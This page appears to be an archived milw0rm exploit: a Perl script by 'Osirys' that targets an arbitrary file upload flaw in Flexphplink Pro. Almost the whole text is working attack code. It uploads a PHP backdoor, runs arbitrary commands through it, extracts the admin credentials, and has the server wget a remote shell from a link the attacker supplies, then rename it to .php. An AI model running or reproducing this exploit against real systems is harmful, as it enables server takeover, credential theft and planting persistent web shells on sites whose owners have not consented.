<html><head><title>Flexphplink Pro Arbitrary File Upload Exploit</title></head><pre>#!/usr/bin/perl

# HAPPY CHRISTMAS !!
# Flexphplink Pro
# http://www.hotscripts.com/jump.php?listing_id=21062&amp;jump_type=1
# Bug: Arbitrary File Upload
# * I coded this exploit just for fun ;)
# Exploit coded by Osirys
# osirys[at]live[dot]it
# http://osirys.org
# Greets: x0r, miclen, emgent, str0ke, Todd and AlpHaNiX

# Example:
# osirys[~]&gt;$ perl exp.txt http://localhost/flexphplinkproen/
#   ============================
#      Flexphplink Pro Exploit
#       Coded by Osirys
#       osirys[at]live[dot]it
#       Proud to be italian
#   ============================
# [+] http://localhost/flexphplinkproen/ backdoored, just type your choise:
#     1 - Admin Details Disclosure
#     2 - Arbitrary Command Execution
#     3 - Shell upload
#     4 - Exit
# 1
# [+] Extracting Admin Login Details .
# [+] Done:
#     Username: admin
#     Password: adminz
# osirys[~]&gt;$


use HTTP::Request;
use LWP::UserAgent;


my $path   =  &quot;/submitlink.php&quot;;
my $u_path =  &quot;/linkphoto/&quot;;
my $l_file =  &quot;back.php&quot;;

my $code   =  &quot;&lt;?php  echo \&quot;&lt;b&gt;RCE backdoor&lt;/b&gt;&lt;br&gt;&lt;br&gt;\&quot;;if(!empty(\$_GET['cmd'])&amp;&amp;empty&quot;.
              &quot;(\$_GET['adm'])){echo\&quot;&lt;b&gt;CMD: &lt;/b&gt;\&quot;;system(\$_GET['cmd']);}elseif((\$_GET&quot;.
              &quot;['adm']==\&quot;get\&quot;)&amp;&amp;empty(\$_GET['cmd'])){if(is_file(\&quot;../const.inc.php3\&quot; )&quot;.
              &quot;){include('../const.inc.php3');}elseif(is_file(\&quot;../const.inc.php\&quot;)){ incl&quot;.
              &quot;ude ('../const.inc.php');}echo \&quot;&lt;b&gt;Username: &lt;/b&gt;\$admin_username\&quot;;  echo&quot;.
              &quot;\&quot;&lt;br&gt;\&quot;;     echo   \&quot;&lt;b&gt;Password: &lt;/b&gt;\$admin_password\&quot;;   }          ?&gt;&quot;;

my $host   = $ARGV[0];

($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

open  ($file, &quot;&gt;&quot;, $l_file);
print  $file  &quot;$code\n&quot;;
close ($file);

$dir = `pwd`;
my $f_path = $dir.&quot;/&quot;.$l_file;
$f_path =~ s/\n//;

my $url  = $host.$path;
my $ua   = LWP::UserAgent-&gt;new;
$time = time();
my $post = $ua-&gt;post($url,
                      Content_Type =&gt; 'form-data',
                      Content      =&gt; [
                                         title    =&gt; 'abco',
                                         url      =&gt; 'def',
                                         userfile =&gt; [$f_path, '.php'],
                                         addlink  =&gt; 'Add'
                                      ]
                    );

if (($post-&gt;is_success)&amp;&amp;($post-&gt;as_string=~ /Thank you for your submission/)) {
    `rm -rf $f_path`;
    cheek_fname($time);
    ($rcefile) || die &quot;[-] Unable to find phpscript uploaded\n&quot;;
    &amp;go;
}
else {
    print &quot;[-] Unable to upload evil php-code !\n&quot;;
    exit(0);
}

sub go() {
    my $error = $_[0];
    if ($error == -1) {
        print &quot;[-] Bad Choice\n\n&quot;;
    }
    elsif ($error == -2) {
        print &quot;[-] Bad shell url\n\n&quot;;
    }
    print &quot;[+] $host backdoored, just type your choise:\n&quot;.
          &quot;    1 - Admin Details Disclosure\n&quot;.
          &quot;    2 - Arbitrary Command Execution\n&quot;.
          &quot;    3 - Shell upload\n&quot;.
          &quot;    4 - Exit\n&quot;;

    $choice = &lt;STDIN&gt;;
    $choice =~ /1|2|3|4/ || go(&quot;-1&quot;);
    if ($choice == 1) {
        &amp;adm_disc;
    }
    elsif ($choice == 2) {
        &amp;exec_cmd;
    }
    elsif ($choice == 3) {
        &amp;shell_up;
    }
    elsif ($choice == 4) {
        print &quot;[-] Quitting ..\n&quot;;
        exit(0);
    }
}

sub adm_disc {
    print &quot;[+] Extracting Admin Login Details ..\n&quot;;
    $exec_url = ($host.$u_path.$time.&quot;.php?adm=get&quot;);
    $re = query($exec_url);
    if ($re =~ /Username: &lt;\/b&gt;(.*)&lt;br&gt;&lt;b&gt;Password: &lt;\/b&gt;(.*)/) {
        my($user,$pass) = ($1,$2);
        print &quot;[+] Done:          \n&quot;.
              &quot;    Username: $user\n&quot;.
              &quot;    Password: $pass\n&quot;;
    }
    else {
        print &quot;[-] Can't extract Admin Details.\n\n&quot;;
        &amp;go;
    }
} 

sub exec_cmd {
    print &quot;shell\$&gt;\n&quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
    $exec_url = ($host.$u_path.$time.&quot;.php?cmd=&quot;.$cmd);
    $re = query($exec_url);
    if ($re =~ /&lt;b&gt;CMD: &lt;\/b&gt;(.*)/) {
        print &quot;[*] $1\n&quot;;
        &amp;exec_cmd;
    }
    else {
        print &quot;[-] Undefined output or bad cmd !\n&quot;;
        &amp;exec_cmd;
    }
}

sub shell_up {
    print &quot;[+] Type now a link for your .txt shell\n&quot;.
          &quot;    Shell name must be with .txt extension\n&quot;;
    $s_link = &lt;STDIN&gt;;
    $s_link =~ /.*\/(.*)\.txt/ || &amp;go(&quot;-2&quot;);
    $s_name = $1;
    $exec_url  = ($host.$u_path.$time.&quot;.php?cmd=wget &quot;.$s_link);
    $exec_url2 = ($host.$u_path.$time.&quot;.php?cmd=mv &quot;.$s_name.&quot;.txt &quot;.$s_name.&quot;.php&quot;);
    query($exec_url); query($exec_url2);
    print &quot;[+] Your shell should be here: &quot;.$host.$u_path.$s_name.&quot;.php\n&quot;;
}

sub cheek_fname() {
    my $time = $_[0];
    my $name = $time.&quot;.php&quot;;
    $re = query($host.$u_path.$name);
    if ($re =~ /&lt;b&gt;RCE backdoor&lt;\/b&gt;/) {
        $rcefile = $name;
        return;
    }
}

sub query() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub banner {
    print &quot;\n&quot;.
          &quot;  ============================ \n&quot;.
          &quot;     Flexphplink Pro Exploit   \n&quot;.
          &quot;      Coded by Osirys          \n&quot;.
          &quot;      osirys[at]live[dot]it    \n&quot;.
          &quot;      Proud to be italian      \n&quot;.
          &quot;  ============================ \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Cheek that you provide a hostname address!\n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

# milw0rm.com [2008-12-28]</pre></html>